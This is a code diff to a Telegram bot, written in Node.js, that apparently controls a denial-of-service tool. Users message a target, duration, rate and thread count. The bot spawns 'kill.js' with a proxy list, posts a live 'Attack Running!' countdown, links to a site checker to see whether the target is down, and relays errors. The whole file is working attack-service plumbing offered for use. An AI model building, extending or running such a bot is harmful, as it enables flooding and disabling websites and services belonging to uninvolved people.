@@ -70,7 +70,7 @@ bot.on('message', (msg) => {
 
     const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId }
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, remainingTime: time, messageId: null }
 
     const response = {
       status: "Attack Started!",
@@ -94,6 +94,48 @@ bot.on('message', (msg) => {
           ]
         ]
       }
+    }).then(sentMsg => {
+      activeAttacks[attackId].messageId = sentMsg.message_id
+      const interval = setInterval(() => {
+        if (!activeAttacks[attackId]) {
+          clearInterval(interval)
+          return
+        }
+        activeAttacks[attackId].remainingTime -= 10
+        if (activeAttacks[attackId].remainingTime <= 0) {
+          clearInterval(interval)
+          return
+        }
+        const updatedResponse = {
+          status: "Attack Running!",
+          target,
+          time: activeAttacks[attackId].remainingTime,
+          rate,
+          thread,
+          caller: username,
+          index: attackId
+        }
+        bot.editMessageText('```json\n' + JSON.stringify(updatedResponse, null, 2) + '\n```', {
+          chat_id: id,
+          message_id: sentMsg.message_id,
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                {
+                  text: 'Check Website 🔍',
+                  url: `https://check-host.net/check-http?host=${target}`
+                }
+              ]
+            ]
+          }
+        }).catch(err => console.error(`Failed to edit message: ${err.message}`))
+      }, 10000)
+    })
+
+    cmd.stderr.on('data', (data) => {
+      console.error(`kill.js error: ${data}`)
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: `kill.js: ${data}` }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     })
 
     cmd.on('error', (err) => {
@@ -113,7 +155,7 @@ bot.on('message', (msg) => {
       .map(([key, v], i) => ({
         index: key,
         target: v.target,
-        time: v.time,
+        time: v.remainingTime,
         rate: v.rate,
         thread: v.thread
       }))
